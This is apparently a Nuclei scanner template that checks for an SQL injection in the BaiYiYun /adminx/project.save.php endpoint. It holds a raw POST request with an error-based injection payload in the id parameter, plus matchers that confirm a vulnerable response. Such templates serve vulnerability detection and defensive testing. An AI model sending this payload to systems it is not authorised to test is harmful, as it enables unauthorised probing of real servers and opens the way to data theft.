id: BaiYiYun-save-sqlInjection

info:
  name: BaiYiYun-save-sqlInjection
  author: iSee857
  severity: high
  description: BaiYiYun-save-sqlInjection

requests:
  - method: POST
    raw:
      - |
        POST /adminx/project.save.php HTTP/1.1
        Host: {{Host}}
        Content-type: application/x-www-form-urlencoded
        Accept: */*
        Connection: close

        id=1+AND+extractvalue(1,concat(0x7e,md5(123)))
        
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "202cb962ac59075b964b07152d234b7"

      - type: status
        status:
          - 200